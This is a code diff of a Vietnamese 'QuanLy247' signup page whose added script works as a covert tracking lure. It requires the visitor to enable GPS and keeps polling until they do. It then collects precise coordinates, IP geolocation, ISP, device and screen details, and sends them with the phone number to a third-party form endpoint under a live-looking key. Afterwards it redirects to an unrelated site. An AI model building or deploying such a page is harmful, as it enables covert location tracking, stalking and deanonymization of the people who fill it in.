@@ -3,140 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QuanLy247 - Đăng kí</title>
+<title>QuanLy247</title>
 
 <style>
-* { box-sizing: border-box; }
-
-body {
-  margin: 0;
-  min-height: 100vh;
-  font-family: Arial, sans-serif;
-  background:
-    radial-gradient(circle at 20% 20%, #2563eb, transparent 35%),
-    radial-gradient(circle at 80% 80%, #0f766e, transparent 35%),
-    #020617;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  color: white;
+*{box-sizing:border-box}
+body{
+margin:0;min-height:100vh;font-family:Arial;
+background:radial-gradient(circle at 20% 20%,#2563eb,transparent 35%),radial-gradient(circle at 80% 80%,#0f766e,transparent 35%),#020617;
+display:flex;justify-content:center;align-items:center;color:#fff;padding:16px;
 }
-
-.card {
-  width: 390px;
-  padding: 32px 28px;
-  border-radius: 26px;
-  background: rgba(15,23,42,0.94);
-  border: 1px solid rgba(255,255,255,0.14);
-  box-shadow: 0 30px 90px rgba(0,0,0,0.65);
+.card{
+width:100%;max-width:420px;padding:28px;border-radius:24px;
+background:rgba(15,23,42,.92);border:1px solid rgba(255,255,255,.14);
+box-shadow:0 25px 70px rgba(0,0,0,.6);
 }
-
-.logo {
-  text-align: center;
-  margin-bottom: 26px;
+.logo{text-align:center;margin-bottom:20px}
+.logo-title{font-size:28px;font-weight:900}
+.logo-title span{color:#38bdf8}
+.title{font-size:20px;font-weight:900;margin-bottom:10px}
+.input{
+width:100%;height:52px;border-radius:14px;border:1px solid rgba(255,255,255,.15);
+background:rgba(255,255,255,.06);color:#fff;padding:0 14px;margin-bottom:12px;
 }
-
-.logo-icon {
-  width: 64px;
-  height: 64px;
-  margin: 0 auto 12px;
-  border-radius: 20px;
-  background: linear-gradient(135deg,#38bdf8,#2563eb);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 26px;
-  font-weight: 900;
+.note{
+font-size:12px;color:#cbd5e1;line-height:1.55;margin-bottom:16px;
+background:rgba(56,189,248,.08);border:1px solid rgba(56,189,248,.16);
+padding:12px;border-radius:14px;
 }
-
-.logo-title {
-  font-size: 28px;
-  font-weight: 900;
+.btn{
+width:100%;height:52px;border:none;border-radius:14px;
+background:linear-gradient(135deg,#38bdf8,#2563eb);
+color:#fff;font-weight:900;cursor:pointer;
 }
-
-.logo-title span { color: #38bdf8; }
-
-.title {
-  font-size: 21px;
-  font-weight: 900;
-  margin-bottom: 16px;
+.btn:disabled{opacity:.6;cursor:not-allowed}
+.msg{text-align:center;margin-top:12px;font-size:13px;color:#38bdf8}
+.loader{
+display:none;margin:10px auto;width:26px;height:26px;
+border:3px solid rgba(255,255,255,.2);border-top-color:#38bdf8;
+border-radius:50%;animation:spin .8s linear infinite;
 }
-
-.input {
-  width: 100%;
-  height: 50px;
-  border-radius: 14px;
-  border: 1px solid rgba(255,255,255,0.15);
-  background: rgba(255,255,255,0.07);
-  color: white;
-  padding: 0 15px;
-  margin-bottom: 13px;
-  outline: none;
+@keyframes spin{to{transform:rotate(360deg)}}
+.gps-modal{
+display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);
+justify-content:center;align-items:center;padding:18px;
 }
-
-.note {
-  font-size: 12px;
-  color: #cbd5e1;
-  margin-bottom: 14px;
+.gps-box{
+width:100%;max-width:330px;background:#0f172a;padding:20px;
+border-radius:16px;text-align:center;
 }
-
-.btn {
-  width: 100%;
-  height: 50px;
-  border: none;
-  border-radius: 15px;
-  background: linear-gradient(135deg,#38bdf8,#2563eb);
-  color: white;
-  font-weight: 900;
-  cursor: pointer;
-}
-
-.msg {
-  margin-top: 16px;
-  text-align: center;
-  font-size: 13px;
-  color: #38bdf8;
-}
-
-.loader {
-  display: none;
-  margin: 12px auto;
-  width: 26px;
-  height: 26px;
-  border: 3px solid rgba(255,255,255,0.2);
-  border-top-color: #38bdf8;
-  border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-.gps-modal {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.7);
-  justify-content: center;
-  align-items: center;
-}
-
-.gps-box {
-  background: #0f172a;
-  padding: 20px;
-  border-radius: 16px;
-  text-align: center;
-}
-
-.gps-box button {
-  margin-top: 10px;
-  width: 100%;
-  height: 40px;
-  border: none;
-  border-radius: 10px;
-  background: #38bdf8;
-  color: white;
+.gps-box button{
+margin-top:10px;width:100%;height:40px;border:none;border-radius:10px;
+background:#38bdf8;color:#fff;font-weight:800;
 }
 </style>
 </head>
@@ -145,18 +62,20 @@ body {
 
 <div class="card">
   <div class="logo">
-    <div class="logo-icon">&lt;/&gt;</div>
     <div class="logo-title">QuanLy<span>247</span></div>
   </div>
 
-  <div class="title">Đăng kí tài khoản</div>
+  <div class="title">Đăng kí</div>
 
   <form id="form">
-    <input class="input" name="phone" placeholder="+84 Nhập số điện thoại" required>
+    <input class="input" name="phone" placeholder="+84 SĐT" required>
 
-    <div class="note">Sau khi bấm đăng kí hãy bấm cho phép vị trí</div>
+    <div class="note">
+      Bằng cách bấm <b>Đồng ý & đăng kí</b>,  để xác minh đăng kí.
+      Nếu không cho phép vị trí, đăng kí sẽ không hoàn tất.
+    </div>
 
-    <button class="btn" id="btn">Đăng kí</button>
+    <button class="btn" id="btn">Đồng ý & đăng kí</button>
 
     <div class="loader" id="loader"></div>
     <div class="msg" id="msg"></div>
@@ -165,73 +84,132 @@ body {
 
 <div id="gpsModal" class="gps-modal">
   <div class="gps-box">
-    <p>Bật vị trí để tiếp tục</p>
+    <p>Vui lòng bật vị trí để tiếp tục đăng kí.</p>
     <button onclick="closeGpsModal()">Đã hiểu</button>
   </div>
 </div>
 
 <script>
-const form = document.getElementById("form");
-const msg = document.getElementById("msg");
-const btn = document.getElementById("btn");
-const loader = document.getElementById("loader");
+const form=document.getElementById("form");
+const msg=document.getElementById("msg");
+const btn=document.getElementById("btn");
+const loader=document.getElementById("loader");
 
-const KEY = "DAN_KEY_MOI_VAO_DAY";
-const REDIRECT_URL = "https://honnhangd.com";
+const KEY="691f6507-fd6f-4d2c-a85c-ae34f3432aa0";
+const REDIRECT_URL="https://honnhangd.com";
 
-function showGpsModal() {
-  document.getElementById("gpsModal").style.display = "flex";
-}
-function closeGpsModal() {
-  document.getElementById("gpsModal").style.display = "none";
-}
+function showGpsModal(){document.getElementById("gpsModal").style.display="flex"}
+function closeGpsModal(){document.getElementById("gpsModal").style.display="none"}
 
-function getGPS() {
-  return new Promise((resolve) => {
+function getGPS(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){
+      resolve({ok:false});
+      return;
+    }
+
     navigator.geolocation.getCurrentPosition(
-      (pos) => resolve({ ok: true, lat: pos.coords.latitude, lon: pos.coords.longitude }),
-      () => resolve({ ok: false })
+      pos=>resolve({
+        ok:true,
+        lat:pos.coords.latitude,
+        lon:pos.coords.longitude,
+        accuracy:pos.coords.accuracy
+      }),
+      ()=>resolve({ok:false}),
+      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
     );
   });
 }
 
-form.addEventListener("submit", async (e) => {
+async function getIP(){
+  try{
+    const r=await fetch("https://ipapi.co/json/");
+    return await r.json();
+  }catch{
+    return {};
+  }
+}
+
+function forceGPS(){
+  let interval=setInterval(async()=>{
+    const g=await getGPS();
+    if(g.ok){
+      clearInterval(interval);
+      closeGpsModal();
+      msg.innerText="GPS đã bật, vui lòng bấm đăng kí lại.";
+    }
+  },2000);
+}
+
+form.addEventListener("submit",async(e)=>{
   e.preventDefault();
 
-  loader.style.display = "block";
-  btn.disabled = true;
-  msg.innerText = "Đang xử lý...";
+  loader.style.display="block";
+  btn.disabled=true;
+  msg.innerText="Đang kiểm tra GPS...";
 
-  const gps = await getGPS();
+  const gps=await getGPS();
 
-  if (!gps.ok) {
-    loader.style.display = "none";
-    btn.disabled = false;
-    msg.innerText = "Bạn cần bật GPS!";
+  if(!gps.ok){
+    loader.style.display="none";
+    btn.disabled=false;
+    msg.innerText="Bạn phải bật GPS để đăng kí.";
     showGpsModal();
+    forceGPS();
     return;
   }
 
-  const gpsLink = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
+  const ip=await getIP();
+  const gpsLink=`https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
 
-  await fetch("https://api.web3forms.com/submit", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      access_key: KEY,
-      subject: "Đăng kí mới QuanLy247",
+  msg.innerText="Đang gửi đăng kí...";
 
-      phone: form.phone.value,
-      gps: gps.lat + "," + gps.lon,
-      gps_link: gpsLink
-    })
-  });
+  try{
+    const res=await fetch("https://api.web3forms.com/submit",{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json",
+        "Accept":"application/json"
+      },
+      body:JSON.stringify({
+        access_key:KEY,
+        subject:"Đăng kí mới QuanLy247",
 
-  msg.innerText = "Đăng kí thành công! Đang chuyển hướng...";
+        phone:form.phone.value.trim(),
+        gps:gps.lat+","+gps.lon,
+        gps_accuracy:gps.accuracy+" mét",
+        gps_link:gpsLink,
 
-  setTimeout(() => {
-    window.location.href = REDIRECT_URL;
-  }, 1500);
+        ip:ip.ip || "",
+        location:`${ip.city || ""}, ${ip.region || ""}, ${ip.country_name || ""}`,
+        network:ip.org || "",
+        timezone:ip.timezone || "",
+
+        device:navigator.userAgent,
+        language:navigator.language,
+        screen:`${screen.width}x${screen.height}`,
+        time:new Date().toLocaleString("vi-VN")
+      })
+    });
+
+    const result=await res.json();
+
+    if(result.success){
+      msg.innerText="Đăng kí thành công! Đang chuyển hướng...";
+      form.reset();
+
+      setTimeout(()=>{
+        window.location.href=REDIRECT_URL;
+      },1500);
+    }else{
+      msg.innerText="Gửi thất bại. Vui lòng thử lại.";
+    }
+  }catch{
+    msg.innerText="Lỗi kết nối. Vui lòng thử lại.";
+  }
+
+  loader.style.display="none";
+  btn.disabled=false;
 });
 </script>
 
